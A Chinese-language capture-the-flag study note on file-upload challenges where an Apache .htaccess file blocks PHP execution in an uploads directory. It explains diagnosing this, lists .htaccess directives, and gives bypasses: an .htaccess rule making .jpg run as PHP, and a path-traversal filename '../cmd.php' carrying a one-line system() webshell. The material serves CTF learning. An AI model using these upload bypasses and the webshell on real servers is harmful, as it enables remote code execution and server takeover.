# Web笔记16 · 文件上传与 `.htaccess` 禁解析套路

> 适用场景：文件上传题，传了 `.php` 却"能传不能跑"。
> 关联 WP：[WP-[qsnctf]文件上传路径穿越绕过解析限制getshell.md](./WP-%5Bqsnctf%5D%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E8%B7%AF%E5%BE%84%E7%A9%BF%E8%B6%8A%E7%BB%95%E8%BF%87%E8%A7%A3%E6%9E%90%E9%99%90%E5%88%B6getshell.md)（端口 40536）
> 日期：2026-08-15

---

## 0. 一句话先讲清

> 传 `.php` 时**不报错、能访问、但页面把源码原文吐出来** → 这个目录的 PHP 被"禁解析"了 → Apache 目录级禁解析十有八九是 `.htaccess` → 直接 `curl /该目录/.htaccess`，**403 = 存在，404 = 不存在**，一秒验证。

---

## 1. `.htaccess` 是什么

- **Apache 的"目录级配置文件"**：放在某个目录里，对该目录及其所有子目录即时生效，**不用重启服务器**。
- 出题人最爱用它来控制 `uploads/` 的行为——比如"让这个目录里的 PHP 一律不执行"，专门治"传个 webshell 就完事"的莽撞选手。
- 它不是 PHP 的东西，是 **Web 服务器（Apache）** 的东西。所以 `.htaccess` 的存在和效果，跟 PHP 版本无关，只跟 Apache 配置有关。

> 类比：`.htaccess` 就像挂在某个房间门口的"房间守则"，只对这间房和里面的套间有效；而 `php.ini` 是整栋楼的"大楼规定"。本题只是单个房间（uploads）被下了禁解析令，所以网站根目录照样能跑 PHP——这正是目录级规则的标志。

---

## 2. 核心套路：从"返回形态"反推配置（本题最关键的一课）

上传一个探针 `probe.php` 后，**访问它时服务器返回什么**，决定了下一步往哪想。

| 返回形态 | 说明 | 结论 / 下一步 |
|---|---|---|
| 上传直接报错、文件没存盘 | 后端按后缀拦截 | 换后缀 / 改 Content-Type / 改大小写 |
| 访问时**执行**了（看到 PHP 输出） | 已 getshell | 收工，读 flag |
| 访问时**浏览器弹下载** | 服务器不解析，当二进制发你 | 后缀没被当 PHP，换更"像 PHP"的后缀或改 MIME |
| 访问时**看到 `<?php ... ?>` 源码原文** | 文件存了，但 PHP 引擎对这个目录关闭了 | ⚠️ **目录被禁解析 → 怀疑 `.htaccess`** |
| 访问 `.php` 本身得到 403/404 | 文件没存成功或被拦 | 看上传接口返回，确认存盘与否 |

**本题症状 = 第四行**：文件存了、能访问、但源码被当纯文本吐出来。这就把问题从"PHP 代码怎么写"转移到了"服务器配置怎么挡的"。

### 2.1 为什么推论是 `.htaccess`，而不是别的原因

让"整个目录的 `.php` 全变成纯文本"，在 Apache 里最常见的两行指令就是：

```apache
php_flag engine off          # 关掉该目录的 PHP 引擎
# 或者
AddType text/plain .php      # 把 .php 当成纯文本回应
```

而 `php.ini` / Apache 主配置是**全局**的——如果是它们关的 PHP，网站根目录也该一起哑火。但本题网站根的 `cmd.php` 后来是**能执行**的，所以更坐实了：**只是 `uploads/` 这一个目录被单独下了禁解析令**，而目录级的唯一标准手段就是 `.htaccess`。

> 再加上这是文件上传 CTF 的**固定套路**：作者预置 `.htaccess` 在 `uploads/` 禁解析，逼你去找绕过。症状 + 套路，双重信号指向它。

### 2.2 为什么去访问 `/uploads/.htaccess`，且 403 就实锤

1. 按上面推论，这文件**本来就该躺在 `uploads/` 里**，所以直接去这个目录下找它最自然。
2. 请求 `http://目标/uploads/.htaccess`：
   - 返回 **404** → 这文件压根不存在；
   - 返回 **403 Forbidden** → 文件**存在**，且 Apache 在替它挡枪（拒绝你读）。

为什么是 403 而不是 404？因为 Apache 默认配置里有一条：

```apache
<Files ~ "^\.ht">
    Require all denied
</Files>
```

意思是"**任何以 `.ht` 开头的文件，外部一律禁止读取**"（防你偷看服务器配置）。所以你拿到的 403，等于服务器亲口承认："有这个文件，但不给你看内容。"

> ⚠️ **注意区分**：我们拿到 403 只是**确认了文件存在**，并没读到它的内容（被 403 挡了）。它的"用途"是从前面的"源码泄露"症状**反推**出来的，不是读出来的。

## 3. `.htaccess` 关键指令速查（CTF 文件上传必备）

### 3.1 禁解析——作者用来防你（本题这种）

```apache
# ① 直接关 PHP 引擎（最常用）
php_flag engine off

# ② 把 .php 标记成纯文本（浏览器就显示源码）
AddType text/plain .php

# ③ 解除 .php 的处理器绑定
RemoveHandler .php
RemoveType .php
```

> 这三条效果类似：让目录里的 `.php` "存得下、访问得到、但就是不被当 PHP 跑"。你传再多 `.php` 也只能拿到源码。

### 3.2 强制某后缀当 PHP 跑——**你用来绕过**（反着用）

文件上传题里"上传自己的 `.htaccess`"这一经典手法的原理，就是反过来写：

```apache
# 让 .jpg 被当成 PHP 执行
AddType application/x-httpd-php .jpg
# 或
AddHandler application/x-httpd-php .jpg
```

于是你传一张 `shell.jpg`（内容写 PHP 代码），再访问它，就被当 PHP 执行了。**前提是：你能把 `.htaccess` 本身传进去并覆盖/新建成功**（本题被"同名已存在"堵死，见下）。

### 3.3 访问控制——解释了为什么 403

```apache
# 默认保护：禁止外部读取任何 .ht 开头的文件
<Files ~ "^\.ht">
    Require all denied
</Files>

# 旧版 Apache（2.2）写法等价物：
# Order allow,deny
# Deny from all
```

### 3.4 其他常见指令（见到能认出来即可）

```apache
Options -Indexes          # 关掉目录列表（防你看到目录里有哪些文件）
Options -ExecCGI          # 禁止执行 CGI 脚本
Deny from all             # 禁止访问整个目录（404/403）
AllowOverride None        # 父目录设这个 → 子目录的 .htaccess 全部失效
```

> 实战提醒：`AllowOverride None` 一旦在父级打开，子目录再怎么写 `.htaccess` 都无效——这是"上传 .htaccess 但毫无反应"的另一种可能原因。

## 4. 完整套路闭环（含三步绕过思路）

```
传 .php 成功
   │
   ├─ 访问 → 看到源码原文
   │        │
   │        └─► 推论：目录禁解析 → 怀疑 .htaccess
   │                  │
   │                  └─► curl /目录/.htaccess → 403=存在（实锤）
   │
   └─ 绕过三板斧（本题按顺序试）：
        ① 覆盖 .htaccess（写自己的解析规则）
              → 常失败：后端"同名文件已存在"直接拒
        ② 换后缀（.phtml / .php5 / .pht / 大小写）
              → 通常也被同一条 .htaccess 一起禁掉
        ③ 路径穿越：filename="../shell.php"
              → 后端没用 basename() 过滤 ../ 
              → 文件写到【会解析 PHP 的网站根】
              → 直接 RCE ✅（本题正解）
```

**本题完整攻击链一句话**：
> 上传点只校验大小、保存名完全可控 → `uploads/` 有 `.htaccess` 禁解析且无法覆盖 → 用 `../` 把 webshell 写到会解析 PHP 的**网站根目录** → 直接 RCE → `cat /f*` 读 flag。

## 5. 实战速记命令

```bash
# 1) 探针：传个探针 .php，看访问时返回的是源码还是执行结果
# 2) 验证 .htaccess 是否存在（核心一步）
curl -s -o /dev/null -w "%{http_code}\n" http://目标/uploads/.htaccess
#     输出 403 → 存在且被保护；404 → 不存在

# 3) 若想看 .htaccess 内容（通常 403 看不了；除非题目特意放行）
curl -s http://目标/uploads/.htaccess

# 4) 路径穿越上传 webshell 到网站根（Python 标准库版，见对应 WP 第八节）
#    filename = "../cmd.php"
#    content  = "<?php echo system($_GET['c']); ?>"
#    访问：/cmd.php?c=cat /f*
```

## 7. 一句话学到的 6 件事（复习用）

1. **上传成功 ≠ 能执行**：文件落在哪个目录、该目录是否解析 PHP，决定 webshell 能不能跑。
2. **`.htaccess` 是目录级"规则文件"**：出题人常预置它在 `uploads/` 禁止 PHP 解析。
3. **"源码泄露"是禁解析的指纹**：区别于"下载""报错""执行"三种其他形态。
4. **`curl /dir/.htaccess` 拿 403 = 存在**，404 = 不存在；403 是 Apache 默认保护 `.ht` 文件所致。
5. **`.htaccess` 无法覆盖时换路径穿越**：只要保存名没做 `basename()`/`realpath()` 过滤，`../` 就能写到任意（有写权限的）目录。
6. **"保存到哪"由 `filename` 字段控制**：前端把真实文件名放进 `filename` 字段，后端若直接拼路径就送命。
